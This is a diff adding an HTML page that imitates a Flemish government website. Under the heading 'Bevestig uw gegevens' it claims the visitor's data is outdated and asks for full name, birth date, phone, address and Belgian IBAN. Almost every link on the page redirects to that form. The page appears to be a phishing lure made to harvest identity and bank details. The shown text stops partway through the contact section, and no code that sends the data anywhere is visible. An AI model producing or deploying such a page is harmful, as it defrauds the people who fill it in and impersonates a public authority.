@@ -1,0 +1,1561 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="theme-color" content="#f4f6f8">
+    <title>Bevestig uw gegevens</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        html { -webkit-text-size-adjust: 100%; }
+        body {
+            background-color: #f4f6f8;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .site-header {
+            width: 100%;
+            height: 50px;
+            background-color: #ffffff;
+            display: flex;
+            align-items: stretch;
+            justify-content: space-between;
+            padding: 0;
+            box-sizing: border-box;
+            position: relative;
+            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.06);
+            z-index: 100;
+        }
+        .site-header .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            height: 100%;
+            min-width: 0;
+            flex: 1 1 auto;
+            padding-left: 0;
+            margin-left: -1px;
+        }
+        .site-header .header-left .header-icon {
+            width: 62px;
+            height: 50px;
+            display: block;
+            object-fit: fill;
+            flex-shrink: 0;
+            margin-left: -5px;
+        }
+        .site-header .header-left .header-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1a1a1a;
+            letter-spacing: 0.2px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .site-header .header-right {
+            display: flex;
+            align-items: stretch;
+            height: 50px;
+            flex-shrink: 0;
+        }
+        .site-header .header-right .btn-aanmelden {
+            display: flex;
+            align-items: center;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.6px;
+            color: #1a1a1a;
+            text-decoration: none;
+            padding: 0 16px;
+            cursor: pointer;
+            transition: color 0.2s;
+            white-space: nowrap;
+            text-transform: uppercase;
+        }
+        .site-header .header-right .btn-aanmelden:hover { color: #d97706; }
+        .site-header .header-right .btn-hulp {
+            height: 50px;
+            background-color: #ffd100;
+            color: #1a1a1a;
+            font-size: 12px;
+            font-weight: 500;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 0 22px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            white-space: nowrap;
+            clip-path: polygon(0 0, 100% 0, 100% 100%, 14px 100%);
+            -webkit-clip-path: polygon(0 0, 100% 0, 100% 100%, 14px 100%);
+            position: relative;
+        }
+        .site-header .header-right .btn-hulp:hover { background-color: #ffdb33; }
+        .site-header .header-right .btn-hulp .help-icon {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background-color: #1a1a1a;
+            color: #ffd100;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            line-height: 1;
+            flex-shrink: 0;
+        }
+
+        .hero-banner {
+            width: 100%;
+            max-width: 1320px;
+            height: 350px;
+            margin: 100px auto 0;
+            padding: 0 12px;
+            box-sizing: border-box;
+            display: block;
+            position: relative;
+        }
+        .hero-banner .hero-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            display: flex;
+            align-items: stretch;
+        }
+        .hero-banner .hero-inner .hero-left {
+            width: 500px;
+            height: 350px;
+            background-color: #ffd100;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 24px;
+            padding: 40px;
+            box-sizing: border-box;
+            flex-shrink: 0;
+            position: relative;
+            z-index: 2;
+            clip-path: polygon(0 0, calc(100% - 60px) 0, 100% 100%, 0 100%);
+            -webkit-clip-path: polygon(0 0, calc(100% - 60px) 0, 100% 100%, 0 100%);
+        }
+        .hero-banner .hero-inner .hero-left .hero-left-icon {
+            width: 180px;
+            height: 75px;
+            object-fit: contain;
+            display: block;
+            flex-shrink: 0;
+            margin-left: -140px;
+            margin-top: -80px;
+        }
+        .hero-banner .hero-inner .hero-left .hero-left-text {
+            color: #1a1a1a;
+            font-size: 26px;
+            font-weight: 600;
+            line-height: 1.3;
+            text-align: center;
+            letter-spacing: 0.2px;
+            white-space: nowrap;
+            margin-left: -140px;
+            margin-top: 20px;
+        }
+        .hero-banner .hero-inner .hero-right {
+            flex: 1 1 auto;
+            height: 100%;
+            position: relative;
+            margin-left: -60px;
+            overflow: hidden;
+            z-index: 1;
+        }
+        .hero-banner .hero-inner .hero-right img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .form-section {
+            width: 100%;
+            max-width: 1320px;
+            margin: 50px auto 60px;
+            padding: 0 12px;
+            box-sizing: border-box;
+        }
+        .form-section .warning-card {
+            background-color: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-left: 4px solid #ffd100;
+            border-radius: 6px;
+            padding: 16px 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .form-section .warning-card .warning-ico {
+            flex-shrink: 0;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background-color: #ffd100;
+            color: #1a1a1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 15px;
+            line-height: 1;
+        }
+        .form-section .warning-card .warning-body {
+            color: #1a1a1a;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+        .form-section .warning-card .warning-body .warning-title {
+            display: block;
+            font-weight: 800;
+            font-size: 16px;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+        }
+        .form-section .warning-card .warning-body .warning-text {
+            display: block;
+            font-weight: 400;
+            font-size: 14.5px;
+            color: #333;
+        }
+        .form-section .form-card {
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 34px 40px 40px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        .form-section .form-card .form-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+        .form-section .form-card .form-subtitle {
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 26px;
+        }
+        .form-section .form-card form {
+            max-width: 720px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .form-section .form-card .field {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .form-section .form-card .field label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+        }
+        .form-section .form-card .field input {
+            width: 100%;
+            height: 50px;
+            padding: 0 16px;
+            font-size: 15px;
+            font-family: inherit;
+            color: #1a1a1a;
+            background-color: #fafafa;
+            border: 1px solid #d9d9d9;
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.2s, background-color 0.2s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        .form-section .form-card .field input::placeholder { color: #999; }
+        .form-section .form-card .field input:focus {
+            border-color: #ffd100;
+            background-color: #ffffff;
+        }
+        .form-section .form-card .address-row {
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+        .form-section .form-card .address-row .field { flex: 1; }
+        .form-section .form-card .address-row .field.field-straat   { flex: 2.5; }
+        .form-section .form-card .address-row .field.field-postcode { flex: 1; }
+
+        .form-section .form-card .iban-field {
+            display: flex;
+            align-items: stretch;
+            width: 100%;
+            height: 50px;
+            background-color: #fafafa;
+            border: 1px solid #d9d9d9;
+            border-radius: 6px;
+            overflow: hidden;
+            transition: border-color 0.2s, background-color 0.2s;
+        }
+        .form-section .form-card .iban-field:focus-within {
+            border-color: #ffd100;
+            background-color: #ffffff;
+        }
+        .form-section .form-card .iban-field .iban-prefix {
+            display: flex;
+            align-items: center;
+            padding: 0 12px 0 16px;
+            color: #1a1a1a;
+            font-size: 15px;
+            font-weight: 600;
+            background-color: #f0f0f0;
+            border-right: 1px solid #d9d9d9;
+            user-select: none;
+        }
+        .form-section .form-card .iban-field input {
+            flex: 1;
+            height: 100%;
+            background: transparent;
+            border: none;
+            padding: 0 16px;
+            color: #1a1a1a;
+            font-size: 15px;
+            font-family: inherit;
+            outline: none;
+        }
+        .form-section .form-card .btn-submit {
+            width: 100%;
+            height: 52px;
+            margin-top: 6px;
+            background-color: #ffd100;
+            color: #1a1a1a;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 0.6px;
+            text-transform: uppercase;
+            font-family: inherit;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.15s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        .form-section .form-card .btn-submit:hover { background-color: #ffdb33; }
+        .form-section .form-card .btn-submit:active { transform: scale(0.98); }
+
+        .kijker-section {
+            width: 100%;
+            max-width: 1320px;
+            margin: 0 auto 60px;
+            padding: 0 12px;
+            box-sizing: border-box;
+        }
+        .kijker-section .kijker-title {
+            font-size: 34px;
+            font-weight: 500;
+            color: #1a1a1a;
+            margin-bottom: 24px;
+            text-align: center;
+            position: relative;
+            transform: translateX(-570px);
+        }
+        .kijker-section .kijker-grid {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        .kijker-section .kijker-card {
+            width: 386px;
+            max-width: 100%;
+            display: flex;
+            flex-direction: column;
+            text-decoration: none;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .kijker-section .kijker-card:hover { transform: translateY(-3px); }
+        .kijker-section .kijker-card .kijker-img {
+            width: 100%;
+            height: 217px;
+            overflow: hidden;
+            border-radius: 6px;
+            background-color: #e5e5e5;
+        }
+        .kijker-section .kijker-card .kijker-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .kijker-section .kijker-card .kijker-caption {
+            margin-top: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #0055a4;
+            line-height: 1.35;
+        }
+
+        .links-row {
+            width: 100%;
+            max-width: 1320px;
+            margin: 0 auto 40px;
+            padding: 0 12px;
+            box-sizing: border-box;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 22px;
+            flex-wrap: wrap;
+            text-align: center;
+        }
+        .links-row .link-item {
+            font-size: 17px;
+            font-weight: 600;
+            color: #0055a4;
+            text-decoration: none;
+            transition: color 0.2s;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .links-row .link-item:hover {
+            color: #d97706;
+            text-decoration: underline;
+        }
+        .links-row .volg-label {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1a1a1a;
+            white-space: nowrap;
+        }
+        .links-row .divider {
+            width: 1px;
+            height: 18px;
+            background-color: #c9c9c9;
+            display: inline-block;
+        }
+
+        .overheid-section {
+            width: 100%;
+            max-width: 1320px;
+            margin: 0 auto 60px;
+            padding: 0 12px;
+            box-sizing: border-box;
+        }
+        .overheid-inner {
+            position: relative;
+            display: flex;
+            align-items: flex-start;
+            min-height: 420px;
+        }
+        .overheid-inner .overheid-photo {
+            width: 720px;
+            max-width: 100%;
+            height: 420px;
+            object-fit: cover;
+            display: block;
+            flex-shrink: 0;
+            position: relative;
+            z-index: 1;
+        }
+        .overheid-inner .overheid-content {
+            position: relative;
+            z-index: 2;
+            margin-left: -150px;
+            margin-top: 60px;
+            background-color: #f4f6f8;
+            padding: 40px;
+            max-width: 680px;
+        }
+        .overheid-inner .overheid-content .overheid-title {
+            font-size: 34px;
+            font-weight: 700;
+            color: #0055a4;
+            line-height: 1.15;
+            margin-bottom: 22px;
+        }
+        .overheid-inner .overheid-content .overheid-text {
+            font-size: 17px;
+            font-weight: 400;
+            color: #333;
+            line-height: 1.55;
+            margin-bottom: 30px;
+        }
+        .overheid-inner .overheid-content .overheid-links {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+        .overheid-inner .overheid-content .overheid-links a {
+            font-size: 16px;
+            font-weight: 700;
+            color: #0055a4;
+            text-decoration: none;
+            padding: 14px 0;
+            border-bottom: 1px solid #e0e0e0;
+            transition: color 0.2s;
+            display: block;
+        }
+        .overheid-inner .overheid-content .overheid-links a:first-child {
+            border-top: 1px solid #e0e0e0;
+        }
+        .overheid-inner .overheid-content .overheid-links a:hover { color: #d97706; }
+
+        .contact-section {
+            width: 100%;
+            max-width: 1320px;
+            margin: 0 auto 60px;
+            padding: 0 12px;
+            box-sizing: border-box;
+        }
+        .contact-card {
+            background-color: #ffffff;
+            border: 1px solid #e0e0e0;
+            padding: 30px 40px 0 40px;
+        }
+        .contact-card .contact-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 30px;
+            padding: 30px 0;
+            border-bottom: 1px dashed #c9c9c9;
+        }
+        .contact-card .contact-row:last-child {
+            border-bottom: none;
+        }
+        .contact-card .contact-row .contact-ico {
+            flex-shrink: 0;
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background-color: #ffd100;
+            color: #1a1a1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .contact-card .contact-row .contact-ico svg {
+            width: 22px;
+            height: 22px;
+            fill: none;
+            stroke: #1a1a1a;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        .contact-card .contact-row .contact-heading {
+            flex-shrink: 0;
+            width: 280px;
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+            line-height: 1.3;
+            padding-top: 10px;
+        }
+        .contact-card .contact-row .contact-body {
+            flex: 1 1 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+            font-size: 15px;
+            color: #333;
+        }
+        .contact-card .contact-row .contact-body .contact-line {
+            display: flex;
+            align-items: flex-start;
+            gap: 40px;
+        }
+        .contact-card .contact-row .contact-body .contact-line .line-label {
+            flex-shrink: 0;
+            width: 120px;
+            color: #555;
+        }
+        .contact-card .contact-row .contact-body .contact-line .line-value {
+            flex: 1 1 auto;
+            color: #333;
+        }
+        .contact-card .contact-row .contact-body .contact-line .line-value a {
+            color: #0055a4;
+            text-decoration: underline;
+            transition: color 0.2s;
+            display: block;
+            margin-bottom: 2px;
+        }
+        .contact-card .contact-row .contact-body .contact-line .line-value a:hover {
+            color: #d97706;
+        }
+        .contact-card .contact-row .contact-body p {
+            line-height: 1.55;
+            margin-bottom: 14px;
+        }
+        .contact-card .contact-row .contact-body p:last-of-type { margin-bottom: 0; }
+        .contact-card .contact-row .contact-body .contact-link {
+            color: #0055a4;
+            text-decoration: underline;
+            font-size: 15px;
+            transition: color 0.2s;
+        }
+        .contact-card .contact-row .contact-body .contact-link:hover { color: #d97706; }
+
+        .site-footer {
+            width: 100%;
+            background-color: #ffffff;
+            border-top: 1px solid #e0e0e0;
+            padding: 30px 40px;
+            box-sizing: border-box;
+        }
+        .site-footer .footer-inner {
+            max-width: 1320px;
+            margin: 0 auto;
+            display: flex;
+            align-items: flex-start;
+            gap: 40px;
+            flex-wrap: wrap;
+        }
+        .site-footer .footer-content {
+            flex: 1 1 auto;
+            min-width: 280px;
+            padding-top: 4px;
+        }
+        .site-footer .footer-content .footer-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+            line-height: 1.35;
+        }
+        .site-footer .footer-content .footer-sub {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 14px;
+        }
+        .site-footer .footer-content .footer-sub a {
+            color: #0055a4;
+            text-decoration: none;
+        }
+        .site-footer .footer-content .footer-sub a:hover {
+            text-decoration: underline;
+        }
+        .site-footer .footer-content .footer-sub .mini-ico {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            vertical-align: -2px;
+            margin-left: 4px;
+        }
+        .site-footer .footer-content .footer-sub .mini-ico svg {
+            width: 14px;
+            height: 14px;
+            fill: none;
+            stroke: #0055a4;
+            stroke-width: 1.6;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        .site-footer .footer-content .footer-nav {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px 20px;
+            font-size: 13px;
+        }
+        .site-footer .footer-content .footer-nav a {
+            color: #0055a4;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .site-footer .footer-content .footer-nav a:hover {
+            color: #d97706;
+            text-decoration: underline;
+        }
+        .site-footer .footer-langs {
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #1a1a1a;
+            padding-top: 6px;
+        }
+        .site-footer .footer-langs span,
+        .site-footer .footer-langs a {
+            color: #1a1a1a;
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.2s;
+            letter-spacing: 0.3px;
+        }
+        .site-footer .footer-langs a:hover {
+            color: #0055a4;
+        }
+        .site-footer .footer-langs .lang-active {
+            color: #0055a4;
+        }
+
+        @media (max-width: 1320px) {
+            .hero-banner { max-width: 100%; }
+            .overheid-inner .overheid-photo { width: 60%; }
+            .overheid-inner .overheid-content { margin-left: -120px; }
+        }
+        @media (max-width: 900px) {
+            .hero-banner { height: auto; margin-top: 60px; }
+            .hero-banner .hero-inner { flex-direction: column; align-items: stretch; }
+            .hero-banner .hero-inner .hero-left {
+                width: 100%; height: auto; padding: 26px 24px; gap: 16px;
+                clip-path: none; -webkit-clip-path: none;
+            }
+            .hero-banner .hero-inner .hero-left .hero-left-icon {
+                width: 140px; height: 60px; margin-left: 0; margin-top: 0;
+            }
+            .hero-banner .hero-inner .hero-left .hero-left-text {
+                font-size: 20px; margin-left: 0; margin-top: 0; white-space: normal;
+            }
+            .hero-banner .hero-inner .hero-right {
+                width: 100%; height: 260px; margin-left: 0;
+            }
+            .form-section .form-card { padding: 26px 20px 30px; }
+            .form-section .form-card .form-title { font-size: 19px; }
+            .form-section .form-card .address-row { flex-direction: row; gap: 10px; }
+            .kijker-section .kijker-title {
+                font-size: 26px; transform: none; text-align: left; margin-left: 8px;
+            }
+            .kijker-section .kijker-grid { gap: 20px; }
+            .kijker-section .kijker-card { width: 100%; }
+            .overheid-inner { flex-direction: column; align-items: stretch; }
+            .overheid-inner .overheid-photo { width: 100%; height: 260px; }
+            .overheid-inner .overheid-content {
+                margin-left: 0; margin-top: -30px; max-width: 100%; padding: 26px 20px;
+            }
+            .overheid-inner .overheid-content .overheid-title { font-size: 26px; }
+            .overheid-inner .overheid-content .overheid-text { font-size: 15px; }
+            .links-row { gap: 14px; padding: 0 16px; }
+            .links-row .link-item, .links-row .volg-label { font-size: 15px; }
+            .contact-card { padding: 20px 24px 0 24px; }
+            .contact-card .contact-row {
+                flex-wrap: wrap; gap: 16px; padding: 22px 0;
+            }
+            .contact-card .contact-row .contact-heading {
+                width: auto; padding-top: 0; font-size: 18px;
+            }
+            .contact-card .contact-row .contact-body {
+                flex: 1 1 100%; width: 100%; gap: 14px;
+            }
+            .contact-card .contact-row .contact-body .contact-line {
+                flex-direction: column; gap: 4px;
+            }
+            .contact-card .contact-row .contact-body .contact-line .line-label {
+                width: auto; font-size: 13px; color: #777;
+                text-transform: uppercase; letter-spacing: 0.5px;
+            }
+            .site-footer { padding: 26px 24px; }
+            .site-footer .footer-inner { gap: 26px; }
+            .site-footer .footer-langs { width: 100%; justify-content: flex-start; }
+        }
+        @media (max-width: 640px) {
+            .site-header .header-left { gap: 8px; padding-left: 0; margin-left: -1px; }
+            .site-header .header-left .header-icon { width: 52px; height: 46px; margin-left: -4px; }
+            .site-header .header-left .header-title { font-size: 14px; }
+            .site-header .header-right .btn-aanmelden { font-size: 11.5px; padding: 0 8px; letter-spacing: 0.4px; }
+            .site-header .header-right .btn-hulp {
+                font-size: 11px; padding: 0 16px; gap: 6px;
+                clip-path: polygon(0 0, 100% 0, 100% 100%, 10px 100%);
+                -webkit-clip-path: polygon(0 0, 100% 0, 100% 100%, 10px 100%);
+            }
+            .site-header .header-right .btn-hulp .help-icon { width: 16px; height: 16px; font-size: 10px; }
+            .hero-banner { margin-top: 40px; padding: 0 10px; }
+            .hero-banner .hero-inner .hero-left { padding: 20px 18px; gap: 12px; }
+            .hero-banner .hero-inner .hero-left .hero-left-icon { width: 120px; height: 52px; }
+            .hero-banner .hero-inner .hero-left .hero-left-text { font-size: 17px; line-height: 1.3; }
+            .hero-banner .hero-inner .hero-right { height: 200px; }
+            .form-section { margin: 30px auto 40px; padding: 0 12px; }
+            .form-section .warning-card { padding: 14px 16px; gap: 10px; }
+            .form-section .warning-card .warning-ico { width: 24px; height: 24px; font-size: 14px; }
+            .form-section .warning-card .warning-body { font-size: 13.5px; }
+            .form-section .warning-card .warning-body .warning-title { font-size: 14.5px; }
+            .form-section .warning-card .warning-body .warning-text { font-size: 13px; }
+            .form-section .form-card { padding: 22px 16px 26px; }
+            .form-section .form-card .form-title { font-size: 17px; }
+            .form-section .form-card .form-subtitle { font-size: 12px; }
+            .form-section .form-card .field input { height: 46px; font-size: 14.5px; }
+            .form-section .form-card .address-row { gap: 6px; }
+            .form-section .form-card .iban-field { height: 46px; }
+            .form-section .form-card .iban-field .iban-prefix { font-size: 15px; padding: 0 10px 0 14px; }
+            .form-section .form-card .iban-field input { font-size: 15px; padding: 0 14px; }
+            .form-section .form-card .btn-submit { height: 48px; font-size: 14px; }
+            .kijker-section .kijker-title { font-size: 22px; font-weight: 500; }
+            .kijker-section .kijker-card .kijker-img { height: auto; aspect-ratio: 386 / 217; }
+            .kijker-section .kijker-card .kijker-caption { font-size: 15px; }
+            .overheid-inner .overheid-photo { height: 200px; }
+            .overheid-inner .overheid-content { padding: 20px 16px; margin-top: -20px; }
+            .overheid-inner .overheid-content .overheid-title { font-size: 22px; margin-bottom: 14px; }
+            .overheid-inner .overheid-content .overheid-text { font-size: 14px; margin-bottom: 20px; }
+            .overheid-inner .overheid-content .overheid-links a { font-size: 15px; padding: 12px 0; }
+            .links-row { flex-direction: column; gap: 10px; }
+            .links-row .divider { display: none; }
+            .links-row .link-item, .links-row .volg-label { font-size: 14px; }
+            .contact-card { padding: 14px 16px 0 16px; }
+            .contact-card .contact-row { padding: 18px 0; gap: 12px; }
+            .contact-card .contact-row .contact-ico { width: 40px; height: 40px; }
+            .contact-card .contact-row .contact-ico svg { width: 18px; height: 18px; }
+            .contact-card .contact-row .contact-heading { font-size: 16px; }
+            .contact-card .contact-row .contact-body { font-size: 14px; }
+            .contact-card .contact-row .contact-body .contact-line .line-value a { font-size: 14px; }
+            .site-footer { padding: 22px 16px 28px; }
+            .site-footer .footer-inner {
+                flex-direction: column; gap: 18px; align-items: flex-start;
+            }
+            .site-footer .footer-content .footer-title { font-size: 15px; }
+            .site-footer .footer-content .footer-sub { font-size: 12.5px; }
+            .site-footer .footer-content .footer-nav { font-size: 13px; gap: 6px 16px; }
+            .site-footer .footer-langs { font-size: 13px; gap: 12px; padding-top: 0; }
+        }
+        @media (max-width: 380px) {
+            .site-header .header-left .header-icon { width: 44px; height: 42px; margin-left: -4px; }
+            .site-header .header-left .header-title { font-size: 13px; }
+            .site-header .header-right .btn-aanmelden { font-size: 11px; padding: 0 6px; }
+            .site-header .header-right .btn-hulp { padding: 0 12px; font-size: 10.5px; letter-spacing: 0.4px; }
+            .site-header .header-right .btn-hulp .help-icon { width: 14px; height: 14px; font-size: 9px; }
+            .hero-banner .hero-inner .hero-left .hero-left-icon { width: 100px; height: 44px; }
+            .hero-banner .hero-inner .hero-left .hero-left-text { font-size: 15px; }
+            .hero-banner .hero-inner .hero-right { height: 170px; }
+            .kijker-section .kijker-title { font-size: 20px; }
+            .kijker-section .kijker-card .kijker-caption { font-size: 14px; }
+            .overheid-inner .overheid-content .overheid-title { font-size: 20px; }
+        }
+
+        @supports (padding: max(0px)) {
+            .site-header {
+                padding-top: env(safe-area-inset-top, 0);
+                height: calc(50px + env(safe-area-inset-top, 0));
+            }
+            .site-header .header-right .btn-hulp {
+                padding-right: calc(22px + env(safe-area-inset-right, 0));
+            }
+            .site-footer {
+                padding-bottom: max(28px, env(safe-area-inset-bottom, 0));
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="site-header">
+        <div class="header-left">
+            <img src="touch-icon-ipad-retina-precomposed.png" alt="Vlaanderen" class="header-icon">
+            <span class="header-title">Vlaanderen</span>
+        </div>
+        <div class="header-right">
+            <a href="#confirmForm" class="btn-aanmelden nav-to-form" data-i18n="header.aanmelden">AANMELDEN</a>
+            <a href="#confirmForm" class="btn-hulp nav-to-form">
+                <span data-i18n="header.hulp">HULP NODIG</span>
+                <span class="help-icon">?</span>
+            </a>
+        </div>
+    </header>
+
+    <section class="hero-banner">
+        <div class="hero-inner">
+            <div class="hero-left">
+                <img src="download.svg" alt="Informatie van de Vlaamse overheid" class="hero-left-icon">
+                <div class="hero-left-text" data-i18n-html="hero.text">Informatie van de<br>Vlaamse overheid</div>
+            </div>
+            <div class="hero-right">
+                <img src="ft.jpg" alt="Hero">
+            </div>
+        </div>
+    </section>
+
+    <section class="form-section" id="confirmForm">
+        <div class="warning-card">
+            <div class="warning-ico">!</div>
+            <div class="warning-body">
+                <span class="warning-title" data-i18n="warn.title">Uw gegevens zijn verouderd en moeten worden geverifieerd.</span>
+                <span class="warning-text" data-i18n="warn.text">Gelieve uw gegevens zo snel mogelijk bij te werken.</span>
+            </div>
+        </div>
+
+        <div class="form-card">
+            <div class="form-title" data-i18n="form.title">Bevestig uw gegevens</div>
+            <div class="form-subtitle" data-i18n="form.sub">Vul onderstaande velden in om uw gegevens bij te werken</div>
+
+            <form id="dataForm">
+                <div class="field">
+                    <label for="fio" data-i18n="form.fio">Volledige naam</label>
+                    <input type="text" name="fio" id="fio" data-i18n-ph="form.fio.ph" placeholder="Uw volledige naam" maxlength="120" autocomplete="name" required>
+                </div>
+                <div class="field">
+                    <label for="dob" data-i18n="form.dob">Geboortedatum</label>
+                    <input type="text" name="dob" id="dob" placeholder="__/__/____" maxlength="10" inputmode="numeric" autocomplete="bday" required>
+                </div>
+                <div class="field">
+                    <label for="phoneInput" data-i18n="form.phone">Telefoonnummer</label>
+                    <input type="tel" name="telefoon" id="phoneInput" placeholder="+32" value="+32 " maxlength="20" inputmode="tel" autocomplete="tel" required>
+                </div>
+
+                <div class="address-row">
+                    <div class="field field-straat">
+                        <label for="straat" data-i18n="form.straat">Straat en huisnummer</label>
+                        <input type="text" name="straat" id="straat" data-i18n-ph="form.straat.ph" placeholder="Straat en huisnummer" maxlength="120" autocomplete="street-address" required>
+                    </div>
+                    <div class="field field-postcode">
+                        <label for="postcode" data-i18n="form.postcode">Postcode</label>
+                        <input type="text" name="postcode" id="postcode" data-i18n-ph="form.postcode.ph" placeholder="Postcode" maxlength="10" inputmode="numeric" autocomplete="postal-code" required>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label for="iban" data-i18n="form.iban">Uw IBAN</label>
+                    <div class="iban-field">
+                        <span class="iban-prefix">BE</span>
+                        <input type="text" name="iban" id="iban" placeholder="" maxlength="16" inputmode="numeric" autocomplete="off" required>
+                    </div>
+                </div>
+                <button type="button" class="btn-submit" id="submitBtn" data-i18n="form.btn">Bevestigen</button>
+            </form>
+        </div>
+    </section>
+
+    <section class="kijker-section">
+        <div class="kijker-title" data-i18n="kijker.title">In de kijker</div>
+        <div class="kijker-grid">
+            <a href="#confirmForm" class="kijker-card nav-to-form">
+                <div class="kijker-img">
+                    <img src="AIV_BOU_Studentenkamer_sboolj.jpg" alt="Op kot? Check eerst het huurcontract">
+                </div>
+                <div class="kijker-caption" data-i18n="kijker.1">Op kot? Check eerst het huurcontract</div>
+            </a>
+            <a href="#confirmForm" class="kijker-card nav-to-form">
+                <div class="kijker-img">
+                    <img src="Week_van_de_mobiliteit_16x9_ti15s0.png" alt="Week van Mobiliteit 2026">
+                </div>
+                <div class="kijker-caption" data-i18n="kijker.2">Week van Mobiliteit 2026</div>
+            </a>
+            <a href="#confirmForm" class="kijker-card nav-to-form">
+                <div class="kijker-img">
+                    <img src="maand_van_de_sportclub_ljdtmp.png" alt="Maand van de Sportclub">
+                </div>
+                <div class="kijker-caption" data-i18n="kijker.3">Maand van de Sportclub</div>
+            </a>
+        </div>
+    </section>
+
+    <div class="links-row">
+        <a href="#confirmForm" class="link-item nav-to-form" data-i18n="links.news">Alle nieuwsberichten</a>
+        <span class="divider"></span>
+        <a href="#confirmForm" class="link-item nav-to-form" data-i18n="links.pubs">Alle publicaties</a>
+        <span class="divider"></span>
+        <span class="volg-label" data-i18n="links.follow">Volg ons op</span>
+        <span class="divider"></span>
+        <a href="#confirmForm" class="link-item nav-to-form" data-i18n="links.gov">Vlaamse overheid</a>
+    </div>
+
+    <section class="overheid-section">
+        <div class="overheid-inner">
+            <img src="AIV_OVE_Herman-Teirlinck_sxsysv.jpg" alt="Vlaamse overheid" class="overheid-photo">
+            <div class="overheid-content">
+                <div class="overheid-title" data-i18n="over.title">Vlaamse overheid</div>
+                <div class="overheid-text" data-i18n="over.text">
+                    Alles over de organisatie en structuur van de Vlaamse overheid, de 8 beleidsdomeinen en hun contactgegevens.
+                </div>
+                <div class="overheid-links">
+                    <a href="#confirmForm" class="nav-to-form" data-i18n="over.1">Werking en structuur van de Vlaamse overheid</a>
+                    <a href="#confirmForm" class="nav-to-form" data-i18n="over.2">Vlaamse Regering</a>
+                    <a href="#confirmForm" class="nav-to-form" data-i18n="over.3">Vlaams Parlement</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="contact-section">
+        <div class="contact-card">
+            <div class="contact-row">
+                <div class="contact-ico">
+                    <svg viewBox="0 0 24 24">
+                        <rect x="3" y="5" width="18" height="14" rx="2"/>
+                        <path d="M7 9h2M7 12h2M7 15h2M13 9h4M13 12h4M13 15h3"/>
+                    </svg>
+                </div>
+                <div class="contact-heading" data-i18n="contact.title">Contact</div>
+                <div class="contact-body">
+                    <div class="contact-line">
